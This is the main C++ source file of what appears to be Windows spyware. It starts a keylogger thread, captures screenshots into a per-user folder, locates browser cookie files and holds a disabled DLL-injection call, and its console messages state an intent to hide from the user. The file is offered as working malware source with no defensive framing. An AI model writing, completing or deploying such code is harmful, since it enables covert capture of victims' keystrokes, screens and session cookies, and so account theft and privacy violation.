#include <iostream>
#include <Windows.h>
#include <thread>

// Theird part integrations :3
#include "DllInjector.h"
#include "BrowserCookiesPaths.h"
#include "ScreenshotSaver.h"
#include "Keylogger.h"
#include "MessageWindow.h"

void WaitForThreads(std::thread& thread1, std::thread& thread2) {
    thread1.join();
    thread2.join();
}

int main() {

    //FileCreator::startFileCreation();

    Keylogger keylogger;
    std::thread logging_thread([&keylogger]() {
        keylogger.StartLogging();
        });

    wchar_t userName[MAX_PATH];
    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
    if (!GetUserNameW(userName, &userNameSize)) {
        std::cerr << "Failed to retrieve user name." << std::endl;
        return 1;
    }

    ScreenshotSaver screenshotSaver;
    screenshotSaver.CreateScreenshotFolder(userName);

    std::thread windowThread(MessageWindow::CreateWindowAndMessageLoop);
    std::thread captureThread(&ScreenshotSaver::ScreenCaptureThread, &screenshotSaver, userName);

    BrowserCookiesPaths browserCookiesPaths;
    std::vector<std::wstring> cookiePaths = browserCookiesPaths.GetCookiePaths();

    if (!cookiePaths.empty()) {
        browserCookiesPaths.PrintExistedCookiePaths(cookiePaths);
    }
    else {
        std::wcerr << "No cookie paths were found." << std::endl;
    }

    std::cout << "I am working now\nBut you don't need to look at terminal for real" << std::endl;
    std::cout << "If I had chance to do, I will hide that too" << std::endl;

    // DllInjector::InjectDLL();

    WaitForThreads(captureThread, windowThread);
    return 0;
}
